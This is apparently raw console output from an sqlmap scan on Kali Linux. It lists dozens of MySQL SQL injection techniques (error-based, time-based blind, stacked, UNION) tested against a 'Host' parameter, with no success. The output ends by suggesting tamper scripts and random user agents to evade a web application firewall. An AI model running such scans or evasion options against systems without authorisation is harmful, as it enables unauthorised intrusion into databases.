[05:09:28] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:09:28] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[05:09:28] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[05:09:28] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:09:29] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[05:09:29] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[05:09:29] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[05:09:29] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[05:09:29] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[05:09:29] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[05:09:29] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[05:09:29] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[05:09:29] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[05:09:29] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[05:09:29] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[05:09:29] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:09:29] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[05:09:29] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[05:09:29] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:09:29] [INFO] testing 'MySQL inline queries'
[05:09:29] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:09:29] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:09:29] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:09:29] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:09:29] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:09:29] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:09:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:09:29] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[05:09:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[05:09:29] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[05:09:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[05:09:30] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[05:09:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[05:09:30] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[05:09:30] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[05:09:30] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[05:09:30] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[05:09:30] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[05:09:31] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[05:09:31] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[05:09:31] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[05:09:31] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[05:09:31] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[05:09:31] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[05:09:31] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[05:09:31] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[05:09:31] [INFO] testing 'MySQL AND time-based blind (ELT)'
[05:09:31] [INFO] testing 'MySQL OR time-based blind (ELT)'
[05:09:32] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[05:09:32] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[05:09:32] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:09:32] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:09:32] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[05:09:32] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[05:09:32] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
[05:09:32] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'
[05:09:32] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[05:09:32] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[05:09:32] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[05:09:32] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[05:09:32] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'
[05:09:32] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[05:09:32] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[05:09:33] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[05:09:33] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[05:09:33] [WARNING] parameter 'Host' does not seem to be injectable
[05:09:33] [ERROR] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[05:09:33] [WARNING] HTTP error codes detected during run:
400 (Bad Request) - 3282 times
[05:09:33] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-02132023_0443am.csv'                                                                                                                                                     

[*] ending @ 05:09:33 /2023-02-13/

                                        
